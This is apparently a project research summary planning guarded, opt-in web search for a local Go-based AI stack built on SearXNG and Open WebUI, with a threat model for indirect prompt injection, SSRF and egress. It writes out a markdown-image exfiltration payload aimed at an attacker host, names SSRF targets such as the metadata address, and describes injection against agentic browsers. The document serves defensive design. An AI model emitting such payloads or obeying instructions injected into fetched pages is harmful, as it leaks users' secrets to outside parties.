# Project Research Summary

**Project:** VillaStraylight — v1.5 Web Search (Grounded & Guarded)
**Domain:** Opt-in, guarded, RAG-grounded web search bolted onto a strictly-local Go control-plane AI stack (SearXNG + Open WebUI native search + v1.3 villa-embed/Qdrant + a villa-owned injection guard) on rootless Podman/Fedora
**Researched:** 2026-06-18
**Confidence:** HIGH on integration mechanics and the threat model; MEDIUM on the injection-classifier efficacy and a few version-pinned OWUI env names (must re-verify at the chosen digest)

## Executive Summary

v1.5 adds live web search that grounds the local model's answers in fetched pages — and it does so by **integrating, not rebuilding**. All four research tracks converged on the same shape: exactly **ONE new container** (SearXNG, digest-pinned, on `villa.network` container-DNS-only, no host port) wired into Open WebUI's *native* web search, with the full-page fetch → chunk → embed → retrieve → cite pipeline reusing the **shipped v1.3 villa-embed/Qdrant RAG stack verbatim** — no new vector DB, no new embedder, no new citation plumbing. This is the single most important scope-control confirmation: the differentiator is the guard layer *in front of* the embed, not the embed itself.

The guard-layer integration crux — long the hardest open question — is **solved honestly**. OWUI's released `WEB_LOADER_ENGINE=external` + `EXTERNAL_WEB_LOADER_URL` seam lets a villa-owned **`villa-websafe`** loader container *be* the fetch path and the **sole producer of `page_content`**. Villa thereby owns the exact bytes that get embedded and shown to the model — fetch → sanitize → Unicode/bidi/invisible-char normalize → nonced provenance-fence → flag-not-block classify — with **zero OWUI rebuild**. The honest shape is a tiny Go HTTP service (an internal `villa websafe-serve` subcommand) over a pure, unit-testable `internal/websafe` core (network fetch injected as a `Deps` func), preserving "orchestrate is the only impure module."

The risk picture is dominated by **two claims that must never be false-greened**. "Outbound is bounded" is *provable* with discipline; "safe from injection" is **NOT solvable and must never be claimed**. Prompt injection is defense-in-depth (reduces/flags, never eliminates); the classifier is a heuristic tripwire, not a model (PromptGuard is DeBERTa — it cannot run on `llama-server`, and is deferred behind a must-WIN eval). The real backstop is **egress bounding**: `villa verify search` clones the v1.4 negative-control-first nft/netns harness but with **inverse framing** (the off-allowlist canary must be reachable *unguarded* and blocked *under* the bound — easy to get backwards). Two-plus egress surfaces (SearXNG→upstreams, arbitrary-URL fetcher, OWUI lazy HF/telemetry pulls), SSRF (fetcher dereferencing the dashboard / villa-qdrant / `169.254.169.254` / DNS-rebind), and a **residual browser-side markdown-image exfil channel that container egress does NOT close** must all be handled — and the last documented, not claimed closed.

## Key Findings

### Recommended Stack

ONE new image (SearXNG `docker.io/searxng/searxng`, digest-pinned from a date-tag like `2026.6.17`); Open WebUI (`v0.9.6`, already integrated) gains an env delta only; llama.cpp `villa-embed` and Qdrant are reused unchanged. The villa-owned guard is **pure Go, CGO-free**: `bluemonday` (StrictPolicy active-markup strip) is the non-negotiable core; `goquery`/`go-shiori/go-readability` are *optional* content-quality helpers added only if OWUI loader extraction proves insufficient. See `.planning/research/STACK.md`.

**Core technologies:**
- **SearXNG** (digest-pinned) — the only new container; meta-search → result URLs; `settings.yml` rendered from config with `search.formats: [html, json]`, a generated `secret_key`, `limiter: false` (single local user, else OWUI's JSON calls get 403/429).
- **Open WebUI v0.9.6** (existing) — owns search→fetch→embed→retrieve→cite; villa adds an env block (`ENABLE_WEB_SEARCH`, `WEB_SEARCH_ENGINE=searxng`, `SEARXNG_QUERY_URL…&format=json`, `WEB_LOADER_ENGINE=external`, `EXTERNAL_WEB_LOADER_URL`) with `ENABLE_PERSISTENT_CONFIG=False` mandatory.
- **`villa-websafe`** (new, villa-owned Go service over pure `internal/websafe`) — the fetch path + guard: sanitize (`bluemonday`) + normalize + classify (heuristic) + provenance-fence; sole producer of `page_content`; the only first-party component touching result sites.
- **v1.3 villa-embed (nomic 768-dim) + Qdrant** (reused verbatim) — full-page fetch → chunk → embed → retrieve → `sources` citation; no new plumbing.

### Expected Features

See `.planning/research/FEATURES.md`. Read-only fetch+embed+cite only; **no agentic browsing** (the exact vector that hijacked Perplexity Comet), no link-following (depth=1), no cloud search/extraction APIs (Tavily/Firecrawl), no persisting web content into durable memory/KB.

**Must have (table stakes):**
- SearXNG wired into OWUI native search (container-DNS, env-only behind the orchestrate seam) — the premise.
- Inline citations to live URLs via OWUI's existing top-level `sources` — no new citation plumbing.
- Snippet + full-page fetch → sanitize → embed → grounded answer (needs ctx ≥ 8192, 16384 ideal).
- Per-query/per-session opt-in (OWUI's native toggle), result-count tuning, graceful/honest no-results.

**Should have (competitive differentiators):**
- **Villa-owned injection-defense guard** (strip + normalize + provenance-fence + classify-flag) — THE differentiator vs demonstrably-broken comparables.
- **Provable egress bounding** (`villa verify search`, negative-control-first) — the honest backstop; contains exfil even on a guard miss.
- Injection detection surfaced honestly (strip/flag/quarantine/refuse, never silent); default-OFF byte-identical zero-outbound install; outbound visibility in status/doctor/dashboard.

**Defer (v2+):**
- Focus modes (Academic/News/Reddit), embedding-based reranking (ties to deferred RAG-Q-01), multi-round "quality mode" deep research, and the **PromptGuard DeBERTa classifier sidecar** (behind a must-WIN eval).

### Architecture Approach

Integration research (HIGH confidence, verified against released OWUI source) confirms every recommendation maps to a real existing module. The crux: OWUI owns the entire fetch→embed pipeline internally, so a naive "villa sanitizes the fetch" is architecturally dishonest — but `WEB_LOADER_ENGINE=external` makes OWUI delegate fetching to `villa-websafe`, the released `ExternalWebLoader` contract (`POST {urls}` batches ≤20 → `[{page_content, metadata}]`). See `.planning/research/ARCHITECTURE.md`.

**Major components:**
1. **`villa-searxng`** (new container) — metasearch; rendered exactly like v1.3 qdrant/embed (seam-locked digest const, `villa.network`, no host port).
2. **`villa-websafe`** (new container + pure `internal/websafe` core) — fetch + strip + classify + fence + SSRF/egress re-assertion; sole producer of `page_content`.
3. **OWUI env block + `internal/config`** (modified) — append-only fields (`WebSearchEnabled` opt-in gate, addrs/ports/knobs); env-only wiring with `ENABLE_PERSISTENT_CONFIG=False`; off-render byte-identical to v1.4.
4. **`internal/verify` (`villa verify search`)** (new verb, reused pattern) — clones the v1.4 verify-agent four-layer nft/netns negative-control-first seam.
5. **`internal/status` + dashboard** (modified, LANDS LAST) — `status.Report` 4→5, append-only `web_search` block, hidden-until-data XSS-safe panel.

### Critical Pitfalls

Top items from `.planning/research/PITFALLS.md` (10 total). The framing: this milestone deliberately punctures "zero data leaving the box" — never false-green a privacy or security claim.

1. **Fences-as-defense over-claim** — fences are *one layer*, a hint not a boundary; combined defenses only drop attack success ~73%→~9%. Avoid: defense-in-depth + **normalize invisible/bidi/tag Unicode before fencing** + least privilege; write "reduces/flags, does not eliminate" into the guard doc and status copy; grep-ban "injection-safe".
2. **Vacuous `villa verify search`** (the highest-value false-green here) — checking "search worked" with the network open certifies nothing. Avoid: negative-control-first, allowlist-asserting — off-allowlist canary reachable *unguarded*, blocked *under* the bound (inverse of memory/agent framing); reject an ineffective block, never fabricate PASS.
3. **Unbounded outbound** — the fetcher reaches arbitrary URLs and OWUI lazily pulls HF/telemetry. Avoid: netns/firewall allowlist (searxng upstreams + result hosts only), pre-stage all weights, `HF_HUB_OFFLINE`/telemetry kill switches.
4. **SSRF** — fetcher dereferencing `127.0.0.1:8888` / `villa-qdrant` / `169.254.169.254` / DNS-rebind. Avoid: resolve-and-validate IP, re-check post-redirect, scheme allowlist, netns backstop.
5. **Browser-side markdown-image exfil (zero-click)** — `![x](https://attacker/leak?d=<secret>)` leaks from the operator's browser, *bypassing container egress entirely*. Avoid: **document as a known residual channel** (do NOT claim closed); CSP/same-origin where feasible; verify-case for secret-in-query-string.

Also load-bearing: OWUI `ENABLE_PERSISTENT_CONFIG` first-boot baking + env-name churn (P2); SearXNG json/secret_key/limiter 403/429 footguns (P1); Qdrant bloat + KV/ctx blowup needing a dedicated ephemeral collection + fit reservation (P3); idle-green readiness (P6); surfacing-before-proof / non-append-only schema bump (P6).

## Implications for Roadmap

All four researchers proposed 4–6 phases; reconciled to this clean six-phase sequence (fit/orchestrate → guard → verify → surface-last, one `status.Report` bump, seam-locked literals throughout):

### Phase 1: SearXNG Service
**Rationale:** The premise; nothing grounds without result URLs. Pure orchestrate render path, mirrors v1.3 qdrant/embed exactly.
**Delivers:** `villa-searxng.container`/`.volume` on `villa.network` (seam-locked digest const, no host port); `settings.yml` rendered from config with `search.formats: [html, json]` + generated `secret_key` + `limiter: false`; readiness probe doing a real `format=json` query (200 + parseable JSON, never health-200).
**Addresses:** SearXNG-wired table stake.
**Avoids:** Pitfall 7 (json/secret_key/limiter 403/429); seam-locked image literal (TestSeamGrepGate).

### Phase 2: OWUI Native-Search Wiring
**Rationale:** SearXNG must be reachable before OWUI can call it; env-only behind `buildOpenWebUIView`.
**Delivers:** ordered env block (`ENABLE_WEB_SEARCH`, `WEB_SEARCH_ENGINE=searxng`, `SEARXNG_QUERY_URL…&format=json`, result-count) conditional on `WebSearchEnabled`; `ENABLE_PERSISTENT_CONFIG=False` frozen in golden + asserted in live env; off-render byte-identical to v1.4; drift test binding env keys to orchestrate accessors.
**Uses:** OWUI native searxng provider.
**Avoids:** Pitfall 6 (persistent-config baking + env-name churn — pin var names to the chosen OWUI digest).

### Phase 3: Grounded Fetch → Sanitize → Embed Grounding
**Rationale:** Establishes the fetch path and its resource discipline before the guard's policy is layered on; SSRF guard and ctx-fit live here.
**Delivers:** `WEB_LOADER_ENGINE=external` → `villa-websafe` wiring; full-page fetch → chunk → embed via v1.3 RAG → `sources` citation; **dedicated ephemeral Qdrant collection** (TTL/clean-replace, never the memory/KB store); `recommend` reserves web-search ctx budget (cap result-count × page-size) before chat fit; SSRF guard (resolve-and-validate IP, post-redirect re-check, scheme allowlist).
**Implements:** villa-websafe fetch path; the reuse of v1.3 villa-embed/Qdrant verbatim.
**Avoids:** Pitfall 4 (SSRF), Pitfall 8 (Qdrant bloat / KV-ctx blowup / silent CPU fallback).

### Phase 4: Villa Injection Guard Layer
**Rationale:** You can't verify a guard that doesn't exist; this layers strip/normalize/classify/fence onto the P3 fetch path.
**Delivers:** pure `internal/websafe` core — sanitize (`bluemonday` StrictPolicy) → **Unicode/bidi/invisible/homoglyph normalize** → nonced provenance-fence → heuristic classifier (flag-not-block); `ExternalWebLoader` contract impl; strip/flag/quarantine/refuse user-facing behavior; honest "reduces/flags, not eliminates" copy in package doc + UI; markdown-image residual-channel documented.
**Addresses:** the injection-defense differentiator + honest injection-detection behavior.
**Avoids:** Pitfall 1 (fences-as-defense over-claim), Pitfall 5 (browser-side exfil — documented, not claimed closed).

### Phase 5: Egress-Bounding + `villa verify search`
**Rationale:** Proves the rendered + guarded stack end-to-end; the honest backstop for the headline claim.
**Delivers:** clone the v1.4 verify-agent four-layer seam with **inverse framing** — negative control (off-allowlist canary reachable *unguarded*); bounded run under a real rootless-netns nft block (searxng + websafe egress only); planted-injection guard proof (returned `page_content` stripped + fenced + flagged); chained-fetch control; SSRF internal-host cases; secret-in-query-string exfil case; reject an ineffective block.
**Implements:** the egress-bounded negative-control-first proof.
**Avoids:** Pitfall 2 (vacuous verify), Pitfall 3 (unbounded outbound), and backstops Pitfalls 1/4/5.

### Phase 6: Surfacing (LANDS LAST)
**Rationale:** The byte-frozen contract must bump over a *finished, proven* feature set; surfacing reads, never derives.
**Delivers:** `status.Report` schema **4→5**, one append-only `web_search` block (enabled, searxng/websafe health rows, guard-verdict counters, last-query freshness, outbound-bounded indicator that derives from the *real* `villa verify search` result — not a config bool); hidden-until-data XSS-safe dashboard Web Search panel; `doctor` web-search checks on doctor's own schema; tri-state readiness (ready / degraded-with-reason / Unknown).
**Avoids:** Pitfall 9 (idle-green readiness), Pitfall 10 (surfacing-before-proof / non-append-only schema).

### Phase Ordering Rationale
- **Fit/orchestrate first (P1–P2):** the guard service is wired via `EXTERNAL_WEB_LOADER_URL` — that env + the SearXNG unit must render before anything downstream; these phases own the orchestrate render goldens (other than P6's status golden).
- **Fetch path before guard (P3→P4):** SSRF + ephemeral-collection + ctx-fit are properties of the fetch path; the guard's strip/normalize/fence policy is layered onto an already-bounded fetcher.
- **Guard before verify (P4→P5):** you can't prove a guard that doesn't exist; verify asserts on the guard's stripped+fenced output.
- **Surfacing always last (P6):** the staggered-contract-risk discipline carried verbatim from v1.2/v1.3/v1.4 — exactly one append-only `status.Report` bump, single golden re-freeze.
- **Discipline throughout:** opt-in/default-off, off-render byte-identical, seam-locked image/marker literals (TestSeamGrepGate), CGO-free single static binary, orchestrate the only impure module.

### Research Flags

Phases likely needing `/gsd-plan-phase --research-phase` during planning:
- **Phase 4 (guard):** needs a phase-specific **adversarial injection corpus + a pre-declared injection-detection eval** (precision/recall on planted prompts incl. invisible-Unicode + fence-breakout payloads) — mirror the v1.4 must-WIN-eval discipline; also the rules-vs-model classifier fit decision.
- **Phase 5 (egress):** needs the **exact rootless-netns nft mechanics** for the inverse-framed bound (the v1.4 harness is the template, but the canary/allowlist assertions are new and easy to get backwards).

Phases with standard/established patterns (lighter research):
- **Phase 1–2:** managed-service render + env-only wiring are proven v1.3 patterns (verified in-repo).
- **Phase 6:** the surfacing pattern (one append-only bump, hidden-until-data panel) is the v1.2–v1.4 invariant.

## Confidence Assessment

| Area | Confidence | Notes |
|------|------------|-------|
| Stack | HIGH | Versions verified against Docker Hub / GitHub releases / official docs (June 2026); one MEDIUM flag — the classifier runtime path (DeBERTa can't run on llama-server). |
| Features | MEDIUM | Web-sourced, cross-checked against multiple comparables; no on-hardware OWUI v0.9.x search trial yet. |
| Architecture | HIGH | OWUI external-loader seam + contract verified against released source; v1.3/v1.4 patterns verified against this repo. |
| Pitfalls | HIGH | Integration mechanics + injection threat model well-documented and version-verified; OWUI env-var names churn (re-verify at the pinned digest). |

**Overall confidence:** HIGH (on the integration shape and the threat model; MEDIUM on classifier efficacy and a few version-pinned details).

### Gaps to Address

- **Exact OWUI env-var names at the chosen digest:** both `ENABLE_WEB_SEARCH`/`WEB_SEARCH_ENGINE` and the older `ENABLE_RAG_WEB_SEARCH`/`RAG_WEB_SEARCH_ENGINE` families have existed; confirm the `external` loader + `BYPASS_WEB_SEARCH_EMBEDDING_AND_RETRIEVAL` against the exact pinned `@sha256` before Phase 1/2. → Pin and re-verify at execution.
- **Classifier rules-vs-model fit decision:** heuristic rule pass is the recommended v1.5 baseline; the PromptGuard DeBERTa sidecar is deferred behind a must-WIN eval. → Decide in Phase 4 research with a measured precision/recall corpus.
- **On-hardware result-count × page-size ctx caps:** web pages need ctx ≥ 8192 (16384 ideal); the exact cap that keeps the chat model GPU-resident under search load is unmeasured. → Reserve conservatively in `recommend` (Phase 3) and offload-assert under search load (Phase 5/6).
- **SearXNG limiter/bot-detection tuning** for a single-user local instance — minor; render sane defaults (`limiter: false`, bounded `WEB_SEARCH_CONCURRENT_REQUESTS`).

## Sources

### Primary (HIGH confidence)
- `open-webui/open-webui` source — `retrieval/web/utils.py::get_web_loader`, `retrieval/loaders/external_web.py::ExternalWebLoader`, `config.py` env vars (verified external-loader contract + var names).
- [Open WebUI — SearXNG provider docs](https://docs.openwebui.com/features/chat-conversations/web-search/providers/searxng/) + [env-configuration reference](https://docs.openwebui.com/reference/env-configuration/) — env vars, JSON-format requirement, PersistentConfig precedence.
- [SearXNG — Docker installation / settings.yml](https://docs.searxng.org/admin/installation-docker.html) — formats/secret_key/limiter, secret_key mandatory.
- [microcosm-cc/bluemonday](https://github.com/microcosm-cc/bluemonday) — pure-Go sanitizer, StrictPolicy.
- This repo — `internal/orchestrate/memory.go`, `openwebui.go`, `quadlet/*.tmpl`, `internal/config/villaconfig.go`, PROJECT.md, CLAUDE.md (existing managed-service + env-wiring + config patterns; negative-control-first verify culture).

### Secondary (MEDIUM confidence)
- [Microsoft/arXiv 2403.14720 — Spotlighting](https://arxiv.org/html/2403.14720v1) + [MSRC indirect-injection defense](https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks) — delimiting/data-marking efficacy.
- [Brave — Comet prompt injection](https://brave.com/blog/comet-prompt-injection/) + [Simon Willison](https://simonwillison.net/2025/Aug/25/agentic-browser-security/) — comparable products vulnerable; unsolved-distinguisher problem.
- [aquilax.ai — indirect prompt injection in RAG/agents](https://aquilax.ai/blog/indirect-prompt-injection-rag-agents) + [arXiv 2511.15759](https://arxiv.org/html/2511.15759v1) — ~73%→~9% with combined defenses, defense-in-depth.
- Markdown-image zero-click exfil PoCs (Bing Chat, ChatGPT, Claude, Bard, Copilot, NotebookLM) — embracethered.com, instatunnel.my.
- [meta-llama/Llama-Prompt-Guard-2](https://huggingface.co/meta-llama/Llama-Prompt-Guard-2-86M) + [llama.cpp server README](https://github.com/ggml-org/llama.cpp/blob/master/tools/server/README.md) — DeBERTa classifier NOT GGUF-generative.

### Tertiary (LOW confidence / needs validation)
- [Perplexica self-host guides](https://ossalt.com/guides/self-host-perplexica-open-source-perplexity-2026) — comparable architecture/focus-modes (inform v2 deferrals, not v1.5 scope).
- OWUI discussion #11016 (SearXNG + bypass-embedding JSON 403 interaction) — re-verify against the pinned digest.

---
*Research completed: 2026-06-18*
*Ready for roadmap: yes*
